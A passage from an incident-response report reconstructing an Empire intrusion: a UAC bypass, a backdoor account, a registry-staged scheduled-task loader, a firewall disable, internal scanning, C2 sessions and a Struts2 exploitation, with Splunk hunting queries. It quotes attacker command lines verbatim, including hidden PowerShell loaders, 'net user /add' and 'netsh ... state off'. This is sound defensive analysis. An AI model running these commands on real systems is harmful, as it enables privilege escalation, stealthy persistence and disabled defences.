10:07:05  fodhelper.exe (first)      Medium   parent: powershell.exe (C300)
10:07:06  powershell.exe -NoP -NonI -W Hidden -c
            $x=$((gp HKCU:Software\Microsoft\Windows Update).Update);
            powershell -NoP -NonI -W Hidden -enc $x
                                     High     parent: fodhelper.exe (the Medium instance above)
10:07:06  fodhelper.exe (second)     High     parent: the powershell.exe above
10:07:06  powershell.exe -NoP -NonI -W Hidden -enc <Base64 Empire stager>
                                     High     parent: the above
10:07:08  → 45.77.53.176:443         first beacon of session C442
```

The escalation is visible in the telemetry, but it isn't one process changing integrity level; it's
two separate `fodhelper.exe` process-creation events, one second apart, connected through an
intermediate `powershell.exe`. The first `fodhelper.exe`, at Medium integrity, is the one that
triggers the auto-elevation: `fodhelper.exe` is an auto-elevating binary, and Windows relaunches its
hijacked command at High integrity without a consent prompt. That hijacked command is itself a
`powershell.exe` instance, at High — and it's this High-integrity `powershell.exe` that spawns the
second `fodhelper.exe`, also at High. So the pair of `fodhelper.exe` invocations don't share a direct
parent-child relationship; each is a child of a different `powershell.exe` instance, and the second
`fodhelper.exe`'s High integrity is inherited from its own parent, not carried over from the first
instance. The registry hijack write itself is not captured in the process telemetry used here, but
its effect is: the elevated intermediate `powershell.exe` immediately runs an attacker-controlled
command line, which no legitimate invocation of `fodhelper.exe` produces.

The hijacked command is a registry-staged loader, not the payload. It reads a Base64 blob from
`HKCU:\Software\Microsoft\Windows Update`, value `Update` (a key path chosen to resemble a
Windows-native location) and passes it to a second `powershell.exe` via `-enc`. This is the same
design as the scheduled-task payload in §4.5 (`HKLM:\Software\Microsoft\Network`, value `debug`):
payload in the registry, loader on the command line, nothing on disk. The pattern appears twice,
nine minutes apart, under two different techniques, which makes it an operator design preference
rather than a property of either technique.

The bypass produced a new implant, not merely a privilege state. The `-enc` payload at
10:07:06 is an Empire stager, and it begins beaconing two seconds later as session C442. This is
Empire's standard escalation model: the base agent is not elevated in place; an elevated agent is
spawned alongside it. The consequence for this investigation is structural: from 10:07:08 onward,
every operator action on this host issues from session C442, while the base implant C300
continues beaconing without issuing commands (§4.2).

The technique required no exploit and no credential, only membership in the local Administrators
group, which the interactive user had.

The same sequence runs a second time. At **11:32:10-11:32:12** the base implant repeated it
byte-for-byte — two `whoami.exe /groups`, then `fodhelper.exe` at Medium and, via the same
intermediate-`powershell.exe` mechanism confirmed for the first instance (§4.3), at High — with
`consent.exe` again observed at the same second — producing **session D8AE**, which began
beaconing at 11:32:16. That repetition is analysed in §4.7. (This second sequence is assumed to
follow the same two-`fodhelper.exe`-instances structure verified for 10:07:05–06; it has not been
independently re-verified against raw telemetry in this pass.)

**Assessment: Confirmed** (bypass executed at 10:07; registry-staged payload path; session C442
produced and attributed by its own C2 traffic). **High confidence** (not independently re-verified
this session) for the 11:32 repetition following the identical mechanism.
**ATT&CK:** T1548.002 (Abuse Elevation Control Mechanism: Bypass User Account Control) ·
T1112 (Modify Registry) · T1027 (Obfuscated Files or Information).

### 4.4 Backdoor account `svcvnc`

At **10:08:17** — seventy-one seconds after session C442 came online — the operator created a local
account, and eighteen seconds later added it to the local Administrators group:

```
10:08:17  net.exe user /add svcvnc Password123!            High   parent: powershell.exe (C442)
10:08:35  net.exe localgroup administrators svcvnc /add    High   parent: powershell.exe (C442)
```

The evidence is three-source:

1. `net.exe` process creation with the full command line;
2. `net1.exe` process creation (`net.exe` delegates to `net1.exe`; both appear, and a detection that
   watches only one of them misses half of all real-world usage);
3. Windows Security **EventID 4720** (user account created) and **4732** (member added to a
   security-enabled local group).

The password, `Password123!`, appears in plaintext in the process command line. This is a
property of `net user` itself, not an attacker mistake, and is the reason command-line
logging is disproportionately valuable on Windows endpoints.

The account name is the tradecraft worth noting. `svcvnc` reads as a service account for a remote
support tool: it is chosen to survive a human eyeballing the account list. The same naming logic
reappears on hoth with the `tomcat7` (UID 0) backdoor account (§7) — an operator signature that
links the Windows and Linux halves of this intrusion behaviourally, independently of the shared C2
address.

Whether `svcvnc` was ever *used* to authenticate is a separate question. A search of the environment
for the corresponding logon activity returned no results, and that finding is carried as **Parked**
in §8 rather than being reported as "the account was never used" — the analytic returned zero across
the whole environment, which raises coverage questions the dataset cannot settle.

**Assessment: Confirmed** (creation) · **Parked** (subsequent use).
**ATT&CK:** T1136.001 (Create Account: Local Account) · T1098 (Account Manipulation).

### 4.5 Persistence: a scheduled task used to deliver a registry-staged payload

At 10:09:44 the elevated task agent (session C442) registered a scheduled task named `Updater`,
running as SYSTEM, scheduled daily at 18:45. The name was chosen for its unremarkableness in a task
list, as `svcvnc` was. The `/TR` argument does not point to a payload file. It is a loader stub:

```
schtasks.exe /Create /F /RU system /SC DAILY /ST 18:45 /TN Updater /TR
  "powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString(
      [Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))\""
```

The stub reads a Base64-encoded, Unicode-encoded value from `HKLM:\Software\Microsoft\Network`, value
`debug`, and executes it via `IEX`. The payload never exists on disk as a file; it is staged in the
registry, and the task's only function is to read and execute it. A file-based indicator search
returns nothing against this design.

The task fired once, 76 seconds after creation. My first read of that firing was "the operator
checking their own persistence works", which turned out to be wrong:

```
10:09:44  FileCreate  svchost.exe (ProcessGuid …-2E72-…) — the Schedule service instance,
                        created in the same second as the schtasks.exe call
10:11:00  powershell.exe -NonI -W hidden -c "IEX (...HKLM:\...debug).debug)))"
          ParentImage: svchost.exe -k netsvcs -p -s Schedule     User: NT AUTHORITY\SYSTEM
          — CommandLine byte-identical to the /TR argument at 10:09:44
10:11:40  whoami.exe                              User: NT AUTHORITY\SYSTEM
```

The parent is the Schedule service host, not an interactive console, and the `svchost` instance was
created the same second as the task registration. That's just Windows initialising a newly created
task. Nothing in the lineage supports "operator triggered this on purpose", so I dropped that reading.

The 10:11:00 execution is session C52C, and it's not a one-off. It began beaconing to
`45.77.53.176:443` at 10:11:03 and ran for 1,017 beacons over 108 minutes total, last seen 11:59:35.
So the task wasn't just persistence on paper; it delivered a live SYSTEM-context implant, and I'm
confirming that from the implant's own sustained traffic, not from the task definition alone.

A second SYSTEM implant shows up four minutes later. I want to be clear this is a separate finding,
not the same loader continuing.

```
10:15:27  powershell.exe -NonI -W hidden -enc <Base64>
          ParentImage: WmiPrvSE.exe (ProcessGuid …-2E7B-…)      User: NT AUTHORITY\SYSTEM
10:15:30–11:59:33   → 45.77.53.176:443, 994 beacons, 104 minutes
```

I checked whether this was the same chain as the 10:09:44/10:11:00 sequence, and it isn't: the
`ProcessGuid`/`ParentProcessGuid` lineages share no common process. No WMI event-subscription records
(EventID 19/20/21) appear anywhere in the window, which rules out a standing WMI subscription as the
connector, and the parent `WmiPrvSE.exe` instance has no process-creation event in this host's
telemetry, so it predates my search window. I can't establish what triggered this one. Carrying it as
**Parked** (§8) rather than guessing. Attribution is unaffected; that's settled separately in §4.7.

Then the delivery vehicle was removed:

```
10:16:54  schtasks.exe /Delete /TN Updater /F     User: AzureAD\FyodorMalteskesko  (session C442)
```

84 seconds after C637's first beacon, the operator deleted `Updater`. C52C, the implant that task had
delivered, was still beaconing at the moment of deletion, and kept going for another 103 minutes
after that.

So `Updater` was never the persistence. It was a delivery vehicle, discarded once its payload was
already resident in memory. Practically: an analyst enumerating scheduled tasks and registry autoruns
on this host after 10:16:54 finds a clean system, because there's nothing left in the task store or
on disk to find. What's actually still there is two SYSTEM-context processes beaconing from memory.

I got this window wrong twice before landing here, first calling it unsupported "OPSEC cleanup", then
calling it nothing of interest. Both readings, and what corrected each, are in §10.

**Assessment: Confirmed** — registry-resident task creation; the auto-trigger as Windows Scheduler
behaviour and not operator action; delivery of session C52C, evidenced by that session's own sustained
C2 traffic; deletion of the task at 10:16:54; attribution of session C637 to the same actor and
infrastructure (§4.7). **Parked** — the mechanism that launched `WmiPrvSE.exe → powershell.exe` at
10:15:27 (§8).

**ATT&CK:** T1053.005 (Scheduled Task/Job) · T1112 (Modify Registry, registry-resident payload
storage) · T1070.009 (Indicator Removal: Clear Persistence, deletion of the operator's own scheduled
task after delivery) · T1071.001 / T1573 (Application Layer Protocol, the delivered implants' C2) ·
T1027 (Obfuscated Files or Information).

### 4.6 Host reconnaissance, defence degradation, and the internal sweep

Between 10:40 and 10:47 the operator ran a compact sequence that an earlier pass through this phase
omitted entirely. All four commands issue from session C442 at High integrity.

```
10:40:57  NETSTAT.EXE -an
10:41:46  NETSTAT.EXE -an
10:43:10  hdoor.exe -hbs 192.168.9.1-192.168.9.50 /b /m /n     C:\Windows\Temp\hdoor.exe
10:46:29  netsh.exe advfirewall set allprofiles state off
```

The two `netstat -an` invocations, two and three minutes before the sweep, establish what this
host already talks to before the operator asks what else exists. Local state first, then the
segment: this ordering is the
reconnaissance sequence of an operator orienting on an unfamiliar host, and it strengthens the
target-selection analysis in §6: the sweep was not the operator's first look at the network.

`hdoor.exe` was invoked at **10:43:10** with an explicit range argument
covering `192.168.9.1–192.168.9.50`. The resulting connection attempts appear in Sysmon EventID 3
between **10:43:31 and 10:44:05** — 34 seconds — and enumerate six live hosts (§6.1). The binary
sits in `C:\Windows\Temp`, a directory the operator also used for the exploitation tooling (§7.2).

The Windows Firewall was then disabled on all profiles:

```
netsh.exe advfirewall set allprofiles state off
```

This single command disables the Domain, Private and Public firewall profiles simultaneously. It
executed at 10:46:29, after the segment was mapped and nineteen minutes before the first command
against `hoth`. Thirty-seven seconds later, session C442 made its only connection on port 3333 to
`45.77.53.176`. This is a single record, not a sustained channel, and its purpose is not established
(§8).
The temporal proximity between the firewall change and this one-off connection is suggestive, but the
connection's outcome is not known from a single record, and no causal claim is made here beyond
noting the sequence.

**Assessment: Confirmed** (all four commands, with full command lines and process lineage; the
single port-3333 connection and its timing) · **Parked** (the operational motive for disabling the
firewall; the purpose and outcome of the port-3333 connection).

**ATT&CK:** T1049 (System Network Connections Discovery) · T1046 (Network Service Discovery) ·
**T1562.004 (Impair Defenses: Disable or Modify System Firewall)**.

### 4.7 Five concurrent Empire sessions, and the structure among them

Once I knew §4.2's count was wrong, the fix was to stop grouping by what I'd been grouping by.
Aggregating every Sysmon EventID 3 connection to `45.77.53.176` across 09:00–18:00 by `ProcessGuid`,
instead of by image and destination, resolves this host's C2 traffic into five distinct sessions
totalling well over 3,850 beacons. That's not a refinement of the same approach; it's the aggregation
key itself being the finding. Grouping by `Image`/`DestinationIp` alone collapses all five sessions
into one row, which is exactly the mistake the earlier single-session reading made (§4.2). I only
found this once I asked why one process would run for two hours without ever touching `hoth`, and
went looking for a second process instead of assuming there was only one.

```spl
index=botsv3 host="FYODOR-L" sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
| eval readable_time=strftime(_time, "%Y-%m-%d %H:%M:%S")
| where readable_time>="2018-08-20 03:00:00" AND readable_time<="2018-08-20 12:00:00"
| rex field=_raw "<EventID>(?<EventID>\d+)</EventID>"
| rex field=_raw "Name='DestinationIp'>(?<DestinationIp>[^<]+)"
| rex field=_raw "Name='ProcessGuid'>\{(?<ProcessGuid>[^\}]+)\}"
| rex field=_raw "Name='Image'>(?<Image>[^<]+)"
| rex field=_raw "Name='User'>(?<User>[^<]+)"
| where EventID="3" AND DestinationIp="45.77.53.176"
| stats count as beacons, min(_time) as first_beacon, max(_time) as last_beacon,
        values(Image) as Image, values(User) as User by ProcessGuid
| eval first_beacon=strftime(first_beacon, "%H:%M:%S"), last_beacon=strftime(last_beacon, "%H:%M:%S")
| sort first_beacon
```

This query returns 3,850 rows across five `ProcessGuid` values, matching the beacon count stated
throughout this section. (The window above is already shifted six hours to match this account's
display timezone, per the note in §4.2; the 09:00–18:00 span quoted in prose is true UTC.)

The five `ProcessGuid` values in the output correspond one-to-one with the five sessions below;
matching each against its `ParentProcessGuid` (via a second, identical query filtered to `EventID=1`)
is what establishes the parent-image column and, in turn, the role each session played.

| Session | Integrity | Parent | First beacon | Last beacon | Beacons | Duration |
|---------|-----------|--------|--------------|-------------|---------|----------|
| **C300** | Medium | `powershell.exe` (the 10:01:41 stager) | 10:01:46 | 11:59:36 | 1,123 | 118 min |
| **C442** | High | `fodhelper.exe` chain (10:07:06) | 10:07:08 | 11:13:57 | 694 | 67 min |
| **C52C** | SYSTEM | `svchost.exe -k netsvcs -s Schedule` (10:11:00) | 10:11:03 | 11:59:35 | 1,017 | 108 min |
| **C637** | SYSTEM | `WmiPrvSE.exe` (10:15:27) | 10:15:30 | 11:59:33 | 994 | 104 min |
| **D8AE** | High | `fodhelper.exe` chain (11:32:12) | 11:32:16 | 11:34:00 | 22 | 2 min |

These are not five equivalent implants. They fall into three roles, and the roles are legible from
behaviour rather than assumed.

The base implant, C300, holds the foothold and does nothing else. It beacons for the full
observed window and issues exactly four processes of its own: two `whoami.exe /groups` privilege
checks and two `fodhelper.exe` invocations, at 10:07 and again at 11:32. It never creates an
account, touches the registry, scans, or reaches `hoth`. Its role is to survive and to spawn.

The elevated task agents, C442 and D8AE, carry every operator action and are discarded. Session
C442 is responsible for the entire Windows-side operation: `svcvnc` creation (§4.4), the `Updater`
task and its deletion (§4.5), `netstat`, `hdoor`, the firewall disable (§4.6), and every command
issued against `hoth` through the masqueraded HTTP client (§7.2). It stops beaconing at 11:13:57,
one second after it issued the command that established the first reverse shell from `hoth`
(11:13:56, §7.8). A full-day scan of every `iexeplorer.exe` invocation on this host, unfiltered by
`ProcessGuid`, confirms C442 and D8AE are the *only* two parents of that process across the entire
intrusion — there is no sixth session and no orphaned invocation. Session D8AE repeats the pattern
in miniature: created 11:32:12, beacons from 11:32:16, and stops at 11:34:00, the second the
second reverse shell was established (§7.8).

That correspondence occurs twice, and it is exact both times:

> **elevate → work → establish an out-of-band channel → discard the elevated agent**

The resident SYSTEM implants, C52C and C637, hold standing access, and one of them is later
activated for a specific task. For its first hundred minutes, session C52C issues exactly one
process, `whoami.exe` at 10:11:40, and session C637 issues none. Both hold access without acting. At
11:52:16, C52C is used once more:

```
11:52:16  tar.exe -cvzf archive.tar *     ParentProcessGuid: C52C     User: NT AUTHORITY\SYSTEM
```

This is the only data-collection action observed in this intrusion (detection pack, ATT&CK
mapping), and it is issued not
from either of the elevated task agents that carried every prior operator action, but from a resident
implant that had otherwise done nothing for over an hour and a half. The operational logic is
legible: the elevated, disposable agents are used for high-visibility work and discarded; the quiet,
long-lived implant is reserved for the one action the operator chose not to route through a
disposable process. C637, by contrast, issues no process at any point in the observed window.

At 11:34:00, right after D8AE stops, every activity-based reflex on this host returns clean: no
elevated agent, `Updater` already deleted, nothing attacker-related on disk. What's still there is
two SYSTEM implants that have each done nothing observable for over an hour. This is why the
containment recommendation in §9 keys session enumeration on process identity and sustained network
behaviour, not on observed activity.

Attribution across all five is Confirmed, and on more than a shared address: every session beacons
to `45.77.53.176:443`, and the decoded stagers of C300, C442 and C637 share a byte-identical RC4
staging key, a shared listener configuration that two unrelated actors attacking the same
infrastructure would not share. (Callback paths do diverge, C300/C442 use `/admin/get.php`, C637
uses `/login/process.php`, but that's consistent with distinct endpoints on one Empire instance and
doesn't weaken the attribution above.)

Twenty-three seconds after the second reverse shell was established, in a timing coincidence that
resembles but is not cleanup activity, the host ran:

```
11:34:23  cleanmgr.exe /autoclean /d C:              High    ParentProcessGuid: …2E72…
11:34:24  DismHost.exe
11:34:25  TiWorker.exe (servicing stack)
11:34:25  TrustedInstaller.exe
```

The command line, the process chain, and the parent all identify this as Windows' own
`Microsoft\Windows\DiskCleanup\SilentCleanup` scheduled task, not an operator action: the command
line is the task's fixed invocation, the parent `ProcessGuid` is the same Task Scheduler host
(`…2E72…`) that also runs the attacker's own `Updater` (§4.5), and
`DismHost.exe → TiWorker.exe → TrustedInstaller.exe` is the standard Windows Update Cleanup chain,
unrelated to any credential, account or C2 activity here. It's worth stating explicitly rather than
quietly excluding, because it's the same trap that produced the withdrawn "OPSEC cleanup" label in
§4.5: a plausible label on a plausible moment. The difference is that here the telemetry is real and
the timing is coincidental, whereas there the telemetry didn't exist at all. Both failure modes are
covered in §10.

*Boundary statement.* The three long-running sessions are last observed beaconing within a
three-second span (11:59:33–11:59:36). Sysmon EventID 1 and EventID 3 collection on this host is
confirmed to continue for a further three hours, to 15:17 — so this silence is a **true negative**,
not a collection-boundary artefact. The mechanism of termination, however, is not established:
EventID 5 (process termination) carries essentially no coverage on this host — a single record
across the entire 09:12–15:17 window — so its absence for these five sessions cannot be read as
evidence they continued running. This report states only that beacon activity is last observed at
those times, and makes no claim about how or when access to this host ended.

**Assessment: Confirmed** (five sessions, their process lineage, their role separation, attribution
to a single actor by shared staging key and shared destination, and the collection action from
C52C) · **Parked** (the mechanism triggering C637; the termination mechanism at ~11:59; the motive
for the firewall disable and the port-3333 connection; the parent lineage of an additional
SYSTEM-context reconnaissance burst at 11:41:33 — `netstat -nao | findstr LISTENING` and
`wmic os get LocalDateTime` — not yet traced to a specific session).

**ATT&CK:** T1071.001 (Application Layer Protocol) · T1573 (Encrypted Channel) ·
**T1560.001 (Archive Collected Data: Archive via Utility)** — the `tar.exe` collection from C52C.

### 4.8 Transition to internal reconnaissance

Between **10:43:31 and 10:44:05**, `hdoor.exe` swept `192.168.9.0/24` from FYODOR-L's second network
interface, enumerating six live hosts in 34 seconds. This marks the boundary of Phase 2: from this
point the operator is no longer working on the compromised endpoint but through it.

Two things must be established before that movement can be analysed properly — how a single laptop
could reach an entirely different internal segment, and why `hoth` was selected out of six available
targets. Both are addressed in §5 and §6 respectively, and the exploitation of `hoth`
follows in §7.

**ATT&CK:** T1046 (Network Service Discovery).

---

## §5 Network Topology & Unified C2

> **In one line:** one laptop, two network interfaces, and the fact that both halves of this
> intrusion phone home to the same IP.

**Objective.** Establish how a single user laptop was able to reach an entirely different internal
network segment, and determine whether the Windows-side and Linux-side activity belong to one actor
or two.

**Hypothesis.** If one operator drove both halves of the intrusion, that should be provable from
infrastructure convergence — the same external endpoint serving two different implants on two
different operating systems — rather than from tooling similarity alone.

### 5.1 FYODOR-L as a dual-homed pivot host

FYODOR-L carries two network interfaces, and the split between them is the structural reason this
intrusion was able to leave the endpoint at all.

| Interface | Address | Traffic observed |
|-----------|---------|------------------|
| A | **192.168.70.186** — the Internet-egress-routed interface | Microsoft Defender cloud lookups, Splunk forwarder traffic, **and five Empire C2 sessions on 443** — the base implant, both elevated task agents, and both resident SYSTEM implants (§4.2, §4.5, §4.7) |
| B | **192.168.8.103** — the internal-egress interface | `hdoor.exe` sweep of `192.168.9.0/24`, `chrome.exe` sessions to hoth, **and the Struts2 OGNL RCE against hoth** |

The correct discriminator between the two is **destination direction — outbound-to-Internet versus
inbound-to-internal-estate — not process privilege or process type.** This distinction is worth
stating explicitly because the intuitive reading is wrong: one might expect interface A to carry
"system" traffic (Defender, the forwarder) and interface B to carry "user" traffic. It does not. The
Empire beacon is a user-context `powershell.exe` process running as `AzureAD\FyodorMalteskesko`, and
it egresses via interface A alongside the legitimate system services. Routing, not identity,
determines the interface.

A note on terminology that materially affects the ATT&CK mapping in the detection pack:
**192.168.70.186 is an
Internet-egress-routed interface, not a public IP address.** FYODOR-L is not Internet-facing. It
reaches external infrastructure through routed egress, and nothing reaches it inbound from the
Internet.

### 5.2 The detection blind spot this topology creates

The Empire beacon and legitimate Microsoft cloud traffic share the same egress interface, the same
destination port (443), and the same encrypted transport. Across the full observed window
(09:00–18:00), interface A produced well over 3,850 connections to `45.77.53.176` from the five
sessions inventoried in §4.7, against five connections total to Microsoft cloud endpoints; both sets
look identical to any control operating on the tuple (internal source, external destination, port
443). The blind spot below applies to all five sessions across all three privilege contexts, not only
to the earliest one.

The practical consequence: **an environment that suppresses or whitelists "internal host → external
443" as routine cloud traffic masks this C2 channel completely.** No amount of tuning on that axis
recovers it. What does recover it is orthogonal to the tuple — beacon interval regularity, the
originating process image (`powershell.exe` is not a cloud client), and the parent-child lineage of
the connecting process. That is the reasoning behind the behavioural analytic in the detection pack,
and the
recommendation in §9 is a direct consequence of this section rather than generic advice.

### 5.3 The unified C2 infrastructure

`45.77.53.176` — the unified C2 infrastructure — served the five Windows-side Empire sessions
inventoried in §4.7 plus a sixth session: the netcat reverse shell from hoth (Linux, `tomcat8` → root,
§7.5, first observed 11:13:56).

This is the load-bearing evidence for single-actor attribution across the whole intrusion. Tooling
similarity would not be sufficient — commodity offensive tools are shared widely, and two unrelated
actors can both run Empire. A single external IP address terminating six independent sessions across
two implants, two operating systems and three privilege levels, in the same environment, is not a
coincidence available to unrelated actors. The convergence is stronger still on a second axis: the
decoded stagers of sessions C300, C442 and C637 (§4.7) share a byte-identical RC4 staging key — a
shared key means a shared Empire listener configuration, which is harder to explain by coincidence
than a shared destination address alone.

A second, weaker convergence supports the same conclusion behaviourally: the backdoor accounts
created on both hosts (`svcvnc` on Windows, `tomcat7` on Linux) follow an identical naming
philosophy — impersonate a plausible service account so that a human reviewing an account list does
not stop. This is **Indicative** only, and is offered as corroboration of the infrastructure
evidence rather than as an independent basis for attribution.

**Assessment: Confirmed** (unified infrastructure; shared staging key across three sessions) ·
**Indicative** (naming-convention corroboration).

### 5.4 A source-capability caveat carried into Phase 3

Sysmon EventID 3 and `stream:tcp` do not measure the same thing. Sysmon records **connection
attempts at the process layer** — a connection appears whether or not it completes. `stream:tcp`
records **sessions at the transport layer** and requires a session to be observable end-to-end.
The two will therefore disagree on counts for the same activity, and both can be correct. Where
counts in this report differ between the two sources, this is why; neither is treated as a
correction of the other.

**ATT&CK:** T1071.001 (Application Layer Protocol) · T1090 (Proxy / pivot through a compromised
host) · T1573 (Encrypted Channel).

---

## §6 Internal Recon & Target Selection

> **In one line:** a 34-second scan finds six hosts, and one detail, not the port count, explains
> why only one of them gets attacked.

**Objective.** Determine what the operator learned about the internal estate, and reconstruct why
`hoth` — one of six discovered hosts — was the one attacked.

**Hypothesis.** If target selection was rational rather than arbitrary, the discriminating property
of `hoth` should be visible in the scan results themselves; if it was informed by something outside
the scan, that source should leave its own trace.

### 6.1 The hdoor sweep

Between **10:43:31 and 10:44:05** — **34 seconds** — `hdoor.exe` swept `192.168.9.1–50` from
interface B and enumerated **six live hosts**: `.20`, `.25`, `.26`, `.30`, `.31`, `.50`.

Two facts about that sentence deserve emphasis. First, the operator was scanning a segment
(`192.168.9.0/24`) that is not the segment the laptop's internal interface belongs to
(`192.168.8.0/24`), and the scan succeeded — **there is no segmentation control between the user
segment and the server segment**. Second, thirty-four seconds is the entire cost of mapping the
server estate. A defender's window between "the attacker begins reconnaissance" and "the attacker
has a target list" was under a minute, which is why the detection value in this phase sits on the
*scan behaviour itself* rather than on any downstream consequence.

`hoth` (`192.168.9.30`) presented **22/80/8080/3306**.

### 6.2 Why hoth, specifically

The intuitive explanation — "hoth had the most open ports" — does not survive the data: `.31`
presented four ports as well. The discriminator is **what the ports mean**, not how many there are.
`.31`'s profile is SMB-characteristic (a Windows file/service host); `hoth`'s **8080** is the
signature of a Java application server, and 8080 alongside 3306 describes a Java web application
with a MySQL backend.

In August 2018, an exposed Java web application framework was among the most reliably exploitable
targets available, with CVE-2017-5638 a well-known, weaponised, unauthenticated remote code
execution path. The operator selected the host whose service profile advertised the framework family
they already had an exploit for.

**Assessment: High confidence.** The reasoning is inferential — the operator's intent is not
directly evidenced — but it is the only reading consistent with both the scan output and the
exploitation that followed within 21 minutes.

### 6.3 The chrome.exe sessions: a correlation that does not survive testing

Sysmon shows **28 connections** from `chrome.exe` on interface B to `192.168.9.30`, all between
**10:29:07 and 10:58:34**, a window that straddles the hdoor sweep on both sides. That's a lot of
browser traffic to one specific internal host, right around the time the operator was choosing a
target. Aggregated outbound connections from interface B in the same window show `192.168.9.30`
receiving 33 connections against 2–4 for every other discovered host. So it isn't just that hoth got
scanned along with five other machines; someone on this endpoint was actively looking at it in a
browser, repeatedly, in the same window as the scan.

My first read was that this writes its own headline: the operator mined the user's own browsing
history to pick a target, rather than choosing blind off a port scan, and I liked that story. But a
temporal match this strong is exactly the kind I should be suspicious of; correlations this
attractive are rarely tested, they're usually just repeated until they feel confirmed. So before
accepting it, I looked for a test that could actually break it: what did the browser actually
request, and does any of it match what the exploit hit?

```spl
index=botsv3 sourcetype="stream:http" src_ip="192.168.8.103" dest_ip="192.168.9.30"
| eval readable_time=strftime(_time, "%Y-%m-%d %H:%M:%S")
| where readable_time>="2018-08-20 04:29:07" AND readable_time<="2018-08-20 04:58:34"
| table _time, http_method, uri_path, http_user_agent
| sort _time
```

```spl
index=botsv3 sourcetype="stream:http" src_ip="192.168.8.103" dest_ip="192.168.9.30"
  uri_path="*saveGangster*"
| table _time, http_method, uri_path, http_user_agent
| sort _time
```

(Both queries return results against this account's display timezone once the window is shifted six
hours behind the UTC times quoted in prose, per the note in §4.2.)

The first query gave me the browsing session: `/suitecrm/index.php`,
`/frothlyinventory/showcase.action`, `/frothlyinventory/struts/utils.js`, alternating on close to an
exact 60–61-second rhythm, all carrying a standard browser `http_user_agent`, the cadence of a person
clicking through pages, not a script working a target list.

The second query, same host pair and window, gave me the exploitation traffic: a single endpoint,
`/frothlyinventory/integration/saveGangster.action`, hit with `python-requests/2.18.4`. No row is
shared between the two result sets: the exploited path never appears in the browsing session, and
none of the browsed paths appear in the exploitation traffic. That goes against the story I liked.
The correlation in time is real. The correlation in target is not.

So I had to drop the browsing-history explanation. The operator found the endpoint some other way,
most plausibly the exploitation tool's own probing of the application, standard behaviour for a
generalised CVE-2017-5638 tool (§7.2 confirms it's automated). What the browsing session still
establishes, independently and from a source that has nothing to do with the scan, is that the
target application was real and in routine use, a smaller claim than "the operator used this to pick
the target," but the one the data actually supports.

One thing almost pulled me back in. Every `iexeplorer.exe` command line issued against hoth
throughout Phase 3, from the first `whoami` at 11:05:40 through the reverse shell construction,
carries `showcase.action` as its URL argument: the exact same path `chrome.exe` visited. Seeing that
right after I'd just ruled out the browsing connection was the moment I had to stop and check the
command lines against the actual requests, instead of taking the command line at its word. I paired
every Sysmon process-creation event for this tool with the corresponding `stream:http` record, 1–3
seconds later without exception, and every one of them actually lands on `saveGangster.action`, never
on `showcase.action`. The tool's URL argument isn't its request URI; it most plausibly uses the
supplied path only to resolve a target host and port, while the OGNL injection itself goes to a
fixed, tool-internal endpoint. That's a property of the exploitation tool, not a second attack path,
and it doesn't reopen the question above: the endpoint every attacker command actually reaches is
still `saveGangster.action`, distinct from what the browsing session visited. But it's a good reminder
to myself that a command-line argument and an actual request are two different claims, and I should
keep checking them separately rather than assuming one confirms the other.

**Assessment: Confirmed** (browsing occurred; endpoints differ) · the exploitation path is
**Confirmed** not to derive from the browsing session.

**ATT&CK:** T1046 (Network Service Discovery) · T1018 (Remote System Discovery).

---

## §7 Phase 3 — Lateral Movement & Post-Exploitation (hoth)

> **In one line:** the first attempt at root fails, a kernel exploit gets compiled on the victim,
> and the second attempt succeeds.

**Objective.** Reconstruct the compromise of `hoth` end to end: the exploitation vector, the
privilege state at each step, and whether each attacker objective actually succeeded.

**Hypothesis.** If the operator attempted a UID 0 account creation through an unprivileged web
service context, that action should fail; if it did fail, subsequent behaviour should show the
operator solving the privilege problem before retrying. This phase is the test of that hypothesis —
and it is the section where an earlier, single-pass reading of this data was wrong.

### 7.0 A correction carried forward

An earlier assessment of this phase recorded two conclusions that full reconstruction has revised:

1. The `tomcat7` account creation was assessed as *likely failed*, from a single-attempt reading.
   **Revised to Confirmed two-stage: failure, then kernel escalation, then success.**
2. The execution result of the staged kernel exploit was assessed as an *evidence coverage blind
   spot*, on the belief that osquery collection began hours after the event window. **That belief is
   falsified.** `pack_process-monitoring` and `pack_fim_file_events` carry real-time records
   throughout 11:08–11:17 — the FIM record for `/tmp/colonel` lands roughly 30 seconds after the
   staging command. osquery coverage of this window is timely, and the escalation is **High
   confidence Confirmed** as successful.

Both revisions are stated here rather than silently absorbed, because the difference between them is
the difference between "the attacker tried some things on a Linux box" and a causally complete
attack chain.

### 7.1 Execution context: the Tomcat 8 service account (uid 111)

The `frothlyinventory` Struts2 application on hoth runs as **the Tomcat 8 service account (uid 111,
gid 117)**. Every command injected through the RCE — including the first account-creation attempt —
executed in that unprivileged context. osquery `pack_process-monitoring` records
`decorations.username=tomcat8, euid=111` directly.

This can be made precise rather than retained only as a consistency check. The response length for
each injected command is a fixed function of what that command's real output would be, so comparing
`http_content_length` across commands turns response size into indirect confirmation of execution
context, without ever seeing the response body itself.

```spl
index=botsv3 sourcetype="stream:http" src_ip="192.168.8.103" dest_ip="192.168.9.30"
  uri_path="*saveGangster*"
| eval readable_time=strftime(_time, "%Y-%m-%d %H:%M:%S")
| where readable_time>="2018-08-20 05:05:00" AND readable_time<="2018-08-20 05:08:00"
| table _time, http_method, http_content_length, bytes_out
| sort _time
```

The `whoami` response is exactly **8 bytes**, matching `tomcat8\n`. The `id` response is exactly
**54 bytes**, matching `uid=111(tomcat8) gid=117(tomcat8) groups=117(tomcat8)\n`, which additionally
fixes the group name as `tomcat8`, a detail the osquery `euid` evidence alone does not supply. The
`groups` response is exactly **8 bytes**, consistent with the same single-group membership. These are
exact length reconstructions, not approximations, and they corroborate the direct osquery `euid=111`
evidence from an entirely independent source, `stream:http`, not endpoint telemetry. (`response_body`
itself is not captured by `stream:http` in this dataset, so these remain length reconstructions, not
textual confirmation; see §8.1.)

A naming clarification that prevents a serious misreading: `tomcat8` is the legitimate service
account that runs the application, and `tomcat7` is the attacker's backdoor account name,
chosen to sit adjacent to it in an account listing. Evidence distribution confirms the distinction —
`tomcat8` appears across `ps`, `top`, `lsof`, `Unix:ListeningPorts`, `Unix:Service` and package data
(hundreds of events, i.e. an account that actually runs things), while `tomcat7` appears only in
account snapshots, one syslog line and the attack traffic itself. `tomcat7` never runs anything.

### 7.2 Struts2 OGNL RCE (CVE-2017-5638)

The exploitation was issued from FYODOR-L, interface B (192.168.8.103), by
